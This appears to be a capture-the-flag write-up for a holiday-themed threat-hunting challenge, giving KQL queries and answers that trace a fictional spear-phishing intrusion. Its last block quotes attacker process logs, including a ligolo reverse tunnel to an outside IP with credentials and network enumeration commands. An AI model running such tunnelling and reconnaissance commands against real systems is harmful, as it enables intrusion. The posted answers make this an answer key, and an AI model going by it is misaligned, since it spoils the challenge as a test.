- How many Craftperson Elf's are working from laptops? ```25```
```Kql
Employees 
| where role has "Craftsperson Elf" 
| where hostname has "LAPTOP"
| count
```
---------------
- What is the email address of the employee who received this phishing email? ```alabaster_snowball@santaworkshopgeeseislands.org```
- What is the email address that was used to send this spear phishing email? ```cwombley@gmail.com```
- What was the subject line used in the spear phishing email? ```[EXTERNAL] Invoice foir reindeer food past due```
```Kql
Email
| where link has "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
```
---------------
- What is the role of our victim in the organization? ```Head Elf```
- What is the hostname of the victim's machine? ```Y1US-DESKTOP```
- What is the source IP linked to the victim? ```10.10.0.4```
```Kql
Employees
| where email_addr == "alabaster_snowball@santaworkshopgeeseislands.org"
```
---------------
- What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs! ```2023-12-02T10:12:42Z```
- What file is dropped to Alabaster's machine shortly after he downloads the malicious file? ```giftwrap.exe```
---------------
```Kql
FileCreationEvents
| where hostname == "Y1US-DESKTOP"
| sort by timestamp
```
---------------
- The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to? ```113.37.9.17```
- What is the timestamp when the attackers enumerated network shares on the machine? ```2023-12-02T16:51:44Z```
- What was the hostname of the system the attacker moved laterally to? ```NorthPolefileshare```
```Kql
ProcessEvents
| where hostname == "Y1US-DESKTOP"
| where timestamp >= datetime("2023-12-02T10:12:42Z")
| where parent_process_hash == "614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f"
```
```
"ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
netstat
ipconfig
arp -a
netstat -an
nbtstat-n
net view /DOMAIN
net share
net use
net config
systeminfo
"C:\Users\alsnowball\AppData\Local\Microsoft\Teams\current\Teams.exe" --type=relauncher --no-sandbox --- 
```
